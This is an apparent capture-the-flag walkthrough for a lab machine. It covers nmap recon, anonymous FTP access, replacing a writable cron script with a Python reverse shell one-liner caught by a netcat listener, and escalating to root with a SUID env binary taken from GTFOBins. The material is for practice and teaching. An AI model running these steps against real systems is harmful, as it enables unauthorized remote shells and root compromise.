- **Target IP: *10.10.200.137*
- **Difficulty: Medium**

---

## 1. Reconnaissance

### `nmap`:

```bash
nmap -sC -sV 10.10.200.137
```

- **Results:**

```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.55.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 2. Enumeration

- Since `ftp` is open lets try connecting with `anonymous` and no pass

```bash
ftp 10.10.200.137
```

- We now have access to the ftp server with no password required

- Inside we find a `scripts` dir and `cd` into it

```bash
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1419 Jul 19 22:48 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

- Lets copy these scripts to our host machine with `get <script_name>`

- Back on our host machine, lets `cat` these scripts to see what they do

```bash
clean.sh

#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

- This appears to be a `cron job` that cleans up the system

- Lets check the `removed_files.log`:

```bash
Running cleanup script:  nothing to delete
...
...
...
```

- So it looks like this `clean.sh` cron job does indeed run on a schedule

## 3. Exploitation

- We can use a reverse shell to replace the `clean.sh` contents and reupload it to the `ftp` server

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.200.137",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- Make sure to replace the default IP to our host IP, and port `1234` will work fine.

- Setup a `netcat` listener on port `1234` on our host machine

```bash
nc -nlvp 1234
```

- Connect back to the `ftp` server and use `put clean.sh` to replace the original cronjob with our reverse shell

- Wait a bit and we get a reverse shell connection on our host machine

```bash
connect to [10.6.55.167] from (UNKNOWN) [10.10.200.137] 36662
/bin/sh: 0: can't access tty; job control turned off
$ whoami
namelessone
```

- Now we can `cat` our `user.txt` flag

## 4. Privilege Escalation

- Our usual `sudo -l` returns:

```bash
sudo: no tty present and no askpass program specified
```

- When we run into this, the next course of action should be:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- **Results:**

```bash
/usr/bin/env
```

- This is our key

### `Gtfobins`

- We find a privilege escalation using `env` on https://gtfobins.github.io/gtfobins/env/ 

```bash
./env /bin/sh -p
```

- Lets try running this:

```bash
/usr/bin/env /bin/sh -p
```

- This successfully escalates us to `root`

```bash
/usr/bin/env /bin/sh -p
# whoami
whoami
root
```

- Lastly, we can `cat` our root flag by

```bash
cat /root/root.txt
```

---

[[CTF Notes]]

